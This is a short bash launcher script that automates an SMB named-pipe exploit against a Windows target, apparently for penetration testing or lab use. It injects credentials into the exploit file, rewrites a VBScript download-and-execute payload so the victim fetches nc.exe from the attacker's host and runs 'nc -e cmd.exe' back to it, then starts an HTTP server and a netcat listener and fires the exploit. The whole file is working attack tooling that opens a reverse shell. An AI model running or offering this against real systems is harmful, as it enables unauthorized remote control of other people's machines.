#!/bin/bash


printf "[i] Usage: ./run.sh <username> <password> <LHOST> <LPORT> <RHOST> <Named_pipe>\n"
printf "[i] Example 1: ./run.sh 'Chopin' 'password' 10.10.10.1 4444 10.10.10.2 Browser\n"
printf "[i] Example 2: ./run.sh '' '' 10.10.10.1 4444 10.10.10.2 ''\n"


printf "[i] Modifying the exploit...."
sed -i "1,/USERNAME/s/USERNAME.*/USERNAME='$1'/" zzz_exploit.py
sed -i "1,/PASSWORD/s/PASSWORD.*/PASSWORD='$2'/" zzz_exploit.py

sed -i '1,/URL.*/s/URL.*/URL = "http:\/\/'$3'\/nc.exe"/' downloadAndExecute.vbs
sed -i '1,/Params.*/s/Params.*/Params = "-n '$3'  '$4' -e cmd.exe"/' downloadAndExecute.vbs


printf "[+] copying nc to current folder\n"
cp /usr/share/windows-resources/binaries/nc.exe nc.exe

printf "[+] Starting Simple HTTP server at port 80\n"
gnome-terminal -t 'Http Server' -- /bin/bash -c 'python -m SimpleHTTPServer 80'


printf "[+] Starting nc listener\n"
gnome-terminal -t 'Listener' -- /bin/bash -c "nc -nlvp $4"


printf "[+] Running exploit"
python zzz_exploit.py $5 $6
